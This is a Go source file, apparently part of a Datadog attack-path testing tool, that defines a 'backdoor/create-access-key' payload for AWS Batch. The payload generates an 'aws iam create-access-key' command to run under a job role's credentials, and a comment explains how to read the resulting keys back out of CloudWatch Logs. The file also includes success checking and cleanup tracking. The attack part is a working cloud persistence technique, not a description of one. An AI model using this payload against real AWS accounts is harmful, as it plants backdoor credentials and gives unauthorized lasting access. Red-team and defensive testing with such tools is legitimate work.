// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"context"
	"fmt"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorCreateAccessKeyPayload generates a single AWS CLI command that creates
// programmatic access keys for an IAM user. The command runs inside the Batch job
// container with the jobRoleArn's credentials.
//
// This payload produces a single "aws iam create-access-key" command and works with
// both aws-cli and generic container runtimes. The created credentials appear in the
// container's stdout (CloudWatch Logs); retrieve them with:
//
//	aws logs get-log-events --log-group-name /aws/batch/job --log-stream-name <stream>
type BackdoorCreateAccessKeyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorCreateAccessKeyPayload{})
}

func (p *BackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *BackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create programmatic access keys for an IAM user via Batch job container command"
}

func (p *BackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to create access keys for (auto-resolved from caller identity if not set)",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/create-access-key payload")
	}
	return nil
}

// GenerateCode returns a single AWS CLI command that creates an access key.
// Works with aws-cli runtime (amazon/aws-cli:latest) since it's a single aws command.
func (p *BackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]
	return fmt.Sprintf("aws iam create-access-key --user-name %s --output json", targetUser), nil
}

// VerifySuccess checks that the target user has at least one active access key.
func (p *BackdoorCreateAccessKeyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetUser := options["TARGET_USER"]
	if targetUser == "" {
		return false, fmt.Errorf("TARGET_USER not set; cannot verify")
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAccessKeys(ctx, &iam.ListAccessKeysInput{
		UserName: aws.String(targetUser),
	})
	if err != nil {
		return false, nil
	}

	return len(result.AccessKeyMetadata) > 0, nil
}

// ReportSideEffects returns the access key creation as a tracked resource for cleanup.
func (p *BackdoorCreateAccessKeyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := options["TARGET_USER"]

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key/%s", targetUser),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"target_user": targetUser,
			},
		},
	}
}

// ProcessResult returns the raw result — credentials appear in container stdout.
func (p *BackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
